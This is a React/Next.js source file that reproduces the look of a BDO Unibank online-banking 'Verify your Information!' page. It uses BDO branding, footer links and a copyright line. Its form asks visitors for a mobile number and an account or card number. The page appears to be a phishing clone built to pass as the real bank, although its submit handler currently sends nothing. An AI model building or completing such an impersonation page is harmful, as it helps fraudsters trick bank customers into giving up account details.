"use client";

import React from 'react';
import { FaUser } from 'react-icons/fa';

const BDOVerifyPage: React.FC = () => {
  return (
    <div style={{
      minWidth: '1000px',
      width: '100%',
      margin: 'auto',
      fontFamily: 'Roboto Regular',
      textAlign: 'left',
      padding: 0,
      height: '100%'
    }}>
      <div style={{
        minWidth: '1000px',
        width: '100%',
        margin: 'auto'
      }}>
        {/* Header */}
        <div style={{
          padding: '20px 0',
          width: '95%',
          position: 'relative',
          marginLeft: 'auto',
          marginRight: 'auto',
          height: '81px',
          zIndex: 100
        }}>
          <div id="contentTop">
            <div style={{
              width: '178px',
              height: '81px',
              float: 'left'
            }}>
              <div style={{
                margin: '0 auto',
                display: 'block',
                width: '178px',
                height: '81px'
              }}>
                <a 
                  href="http://www.bdo.com.ph/" 
                  target="_blank" 
                  rel="noopener noreferrer"
                  style={{
                    display: 'block',
                    width: '151px',
                    height: '81px',
                    position: 'relative',
                    left: '200px',
                    textDecoration: 'none',
                  }}
                >
                  <span style={{visibility: 'hidden'}}>Banco De Oro</span>
                </a>
              </div>
            </div>
            
            <div
              style={{
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                width: '167px',
                height: '28px',
                position: 'relative',
                float: 'right',
                right: '275px',
                borderRadius: '6px',
                fontSize: '6pt',
                background: '#f7af19',
                zIndex: 99,
                fontWeight: 'normal',
                top: '-17px',
              }}
            >
              <a
                href="https://www.bdo.com.ph/"
                target="_blank"
                rel="noopener noreferrer"
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  color: '#fff',
                  textDecoration: 'none',
                  fontSize: '10px',
                  textAlign: 'center',
                }}
              >
                <FaUser size={16} style={{ marginRight: '5px' }} />
                <span>GO BACK TO BDO.COM.PH</span>
              </a>
            </div>
          </div>
        </div>

        {/* Main Content */}
        <div style={{width: '950px', margin: '0 auto'}}>
          <div style={{
            float: 'left',
            width: '100%',
            borderTop: 0,
            minHeight: '400px',
            marginBottom: '50px',
            border: '5px solid #1e4f8e',
            borderRadius: '10px',
            background: '#ffffff'
          }}>
            <div style={{
              borderRadius: '5px 5px 0 0',
              position: 'relative',
              padding: '20px'
            }}>
              <h2 style={{
                margin: 0,
                marginBottom: '15px',
                fontStyle: 'normal',
                fontWeight: 'bold',
                color: '#1D587F',
                fontSize: '12px'
              }}>
                Verify your Information!
              </h2>
              
              <div style={{color: '#717171', fontSize: '12px', marginBottom: '20px'}}>
                Enter required information below.
              </div>

              <div style={{
                background: '#1e4f8e',
                color: '#ffffff',
                padding: '5px 10px',
                fontSize: '12px',
                fontWeight: 'bold',
                borderRadius: '4px',
              }}>
                Online Banking Account Information
              </div>
            </div>

            {/* Form Content */}
            <div style={{padding: '20px', background: '#ffffff'}}>
              <form onSubmit={(e) => e.preventDefault()} autoComplete="off">
                <table style={{width: '100%', borderCollapse: 'collapse'}}>
                  <tbody>
                    <tr>
                      <td style={{width: '150px', padding: '5px 0', verticalAlign: 'top'}}>
                        <label style={{
                          color: '#717171',
                          fontSize: '12px',
                          fontWeight: 'normal'
                        }}>
                          Mobile Number
                        </label>
                      </td>
                      <td style={{padding: '5px 0'}}>
                        <input 
                          type="text"
                          style={{
                            width: '200px',
                            height: '15px',
                            border: '1px solid #cccccc',
                            borderRadius: '0',
                            padding: '2px 5px',
                            fontSize: '11px',
                            backgroundColor: '#FDF9BE'
                          }}
                        />
                      </td>
                    </tr>
                    <tr>
                      <td style={{width: '150px', padding: '5px 0', verticalAlign: 'top'}}>
                        <label style={{
                          color: '#717171',
                          fontSize: '12px',
                          fontWeight: 'normal'
                        }}>
                          Account/Card Number*
                        </label>
                      </td>
                      <td style={{padding: '5px 0'}}>
                        <input 
                          type="text"
                          style={{
                            width: '200px',
                            height: '15px',
                            border: '1px solid #cccccc',
                            borderRadius: '0',
                            padding: '2px 5px',
                            fontSize: '11px',
                            backgroundColor: '#FDF9BE'
                          }}
                        />
                        <div style={{
                          fontSize: '11px',
                          color: '#717171',
                          marginTop: '5px',
                          fontStyle: 'italic'
                        }}>
                          *Enter the last 4 digits of your BDO Debit Card or Checking/Savings account enrolled in BDO Online Banking
                        </div>
                      </td>
                    </tr>
                  </tbody>
                </table>

                <div style={{
                  display: 'flex',
                  gap: '10px',
                  justifyContent: 'center',
                  marginTop: '30px'
                }}>
                  <button
                    style={{
                      padding: '2px 10px',
                      background: '#f7af19',
                      border: 'none',
                      borderRadius: '4px',
                      color: '#666666',
                      fontSize: '11px',
                      cursor: 'pointer',
                      fontWeight: 'bold'
                    }}
                  >
                    Back
                  </button>
                  <button
                    style={{
                      padding: '2px 10px',
                      background: '#f7af19',
                      border: 'none',
                      borderRadius: '4px',
                      color: '#666666',
                      fontSize: '11px',
                      cursor: 'pointer',
                      fontWeight: 'bold'
                    }}
                  >
                    Submit
                  </button>
                </div>
              </form>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div style={{
          margin: '15px auto',
          borderTop: '1px solid #ddd',
          width: '980px',
          clear: 'both'
        }}>
          <div style={{
            fontSize: '10px',
            color: '#999999',
            margin: '0 0 0 30px',
            float: 'left',
            paddingTop: '28px'
          }}>
            BDO Unibank, Inc. © 2015. All Rights Reserved
          </div>
          <div style={{
            width: '700px',
            margin: '0 auto',
            paddingTop: '28px',
            textAlign: 'center',
            float: 'right',
            fontSize: '10px'
          }}>
            {[
              { href: "https://www.bdo.com.ph/about-bdo/business-operations", text: "About BDO" },
              { href: "http://www.bdo.com.ph/corporate-governance", text: "Corporate Governance" },
              { href: "http://www.bdo.com.ph/investor-relations/official-disclosures", text: "Investor Relations" },
              { href: "https://www.careers.bdo.com.ph/", text: "Careers" },
              { href: "https://www.bdo.com.ph/news-and-articles", text: "Press Room" },
              { href: "http://www.bdo.com.ph/hong-kong-home", text: "Hongkong" },
              { href: "https://www.bdo.com.ph/site-map", text: "Site Map" },
              { href: "http://www.bdo.com.ph/privacy-statement", text: "Privacy Policy" }
            ].map((link, index) => (
              <a 
                key={index}
                href={link.href} 
                target="_blank" 
                rel="noopener noreferrer" 
                style={{
                  margin: '0 10px',
                  fontSize: '10px',
                  color: '#999999',
                  textDecoration: 'none'
                }}
              >
                {link.text}
              </a>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
};

export default BDOVerifyPage;

